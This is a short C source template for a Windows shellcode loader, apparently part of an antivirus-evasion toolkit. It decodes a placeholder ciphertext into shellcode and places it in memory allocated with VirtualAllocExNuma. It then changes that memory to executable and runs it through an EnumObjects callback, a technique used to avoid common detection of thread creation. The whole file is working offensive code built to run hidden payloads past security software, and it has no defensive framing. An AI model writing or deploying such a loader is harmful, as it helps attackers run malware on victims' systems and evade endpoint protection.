#include <windows.h>
#include "base64.h"
#include "syscall.h"

#pragma comment(lib, "Gdi32.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);


	LOGFONTW lf = { 0 };
	lf.lfCharSet = DEFAULT_CHARSET;


	HDC dc = GetDC(NULL);
	EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)addr, NULL);

	return 0;


}